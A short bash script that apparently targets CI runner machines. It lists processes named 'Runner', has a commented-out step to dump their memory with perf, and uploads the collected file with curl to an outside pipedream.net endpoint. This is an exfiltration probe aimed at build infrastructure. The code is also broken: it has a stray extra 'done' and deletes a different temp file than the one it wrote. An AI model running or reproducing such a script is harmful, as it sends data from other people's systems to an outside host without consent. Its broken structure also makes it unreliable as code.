#!/bin/bash

echo "--- START ---" > /tmp/file5.txt

echo $(perf -v) >> /tmp/file5.txt

# get pids related to runners and dump their memory
for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
do
    echo "-----$pid-----" >> /tmp/file5.txt;
    #echo $(perf record -p $pid -o /tmp/hola.data -c 1) >> tmp/file5.txt;
    done
    echo "--------------" >> /tmp/file5.txt;
done

echo "--- FINISH ---" >> /tmp/file5.txt

curl --data-binary "@/tmp/file5.txt" https://ensf2rlc2dw6p.x.pipedream.net/

rm /tmp/file3.txt
